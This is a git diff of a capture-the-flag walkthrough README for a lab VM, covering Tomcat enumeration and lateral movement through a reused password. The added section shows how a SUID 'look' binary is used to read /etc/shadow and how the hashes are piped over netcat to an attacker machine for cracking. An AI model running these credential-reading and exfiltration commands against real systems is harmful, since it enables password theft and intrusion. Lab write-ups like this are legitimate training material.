@@ -21,7 +21,7 @@ Port 80 seems to be useless or may require different scan parameters, however po
 ps: Randy may be a log in credential</br>
 
 ## Searching for Exploits
-There is a few interesting directories. Before i start looking into the Backup.zip i would like to know what kind of access we have to /manager directory for the tomcat server.
+There is a few interesting directories. Before i start looking into the Backup.zip i would like to know what kind of access we have to /manager directory for the tomcat server.</br>
 ![Alt text](/Images/ManagerLogIn.png?raw=true "Readme.txt")</br>
 Exciting!! it seems we have a location to put stolen credential if we can find them. Once you've tried some default passwords and attempt to log in anonymously (sorry but it most likely wont be that easy) we can shift our focus.
 For now we will focus on the backup.zip.by typing into the browser http://<TargetIPAddress>:8080/backup.zip or using curl in the terminal curl http://<TargetIPAddress>:8080/backup.zip --output <file_name>
@@ -58,13 +58,26 @@ If you would prefer a colour coded terminal for readability like me you can o th
 - source etc/skel/.bashrc
 ![Alt text](/Images/UpgradingTerminal.png?raw=true "Readme.txt")
 
-## Escalation 
+## Escalation Attempt
 In home/randy we find 3 interesting files including the user flag!
-![Alt text](/Images/RandyNoteflagPY.png?raw=true "Readme.txt")
+![Alt text](/Images/RandyNoteFlagPY.png?raw=true "Readme.txt")
 The note indicates we Randy had restricted permissions at the moment, this is worth noting but not necessarily an issue. We have also found a python file, this could be a good escalation opportunity. Using ls -al we see it was made by a root user, however with the current user (you may check this with the command whoami) we do not have many permissions or the password to use sudo. Lets have another look at that SSH port for a different log in.
 
+## Lateral Movement
+We can see from when we look at the password 'melehifokivai' in the TomcatUser.xml file it has been reused for manager and admin. It seems typing jaye@10.0.2.16 followed by the password melehifokivai. 
+After some exploring we can see a function called look that can be executed and when executed it runs as root regardless of permissions of the user since it has both the SUID and SGID bit set.
+With some exploring it seems like look uses a specific syntax much like a grep function to find files. now i will look for shadow files typing 
+./look "<username>" /etc/shadow. This returns the following</br>
+![Alt text](/Images/LookFunction.png?raw=true "Readme.txt")</br>
+Pretty interesting, its returning hashes of users for us. Now lets exfiltrate this to our kali system so that we can try and decrypt them. 
+on the attacking machine, type 
+nc -lnvp 9999 > hashes.txt
 
-
+on the target machine type...
+./look '' /etc/shadow | grep '\$' | nc 10.0.2.15 9999
+![Alt text](/Images/MovingHashesToKali].png?raw=true "Readme.txt")</br>
+Next we will use john to extract the hashes as so
+![Alt text](/Images/HashContentsAndRipper].png?raw=true "Readme.txt")</br>
 
 
 
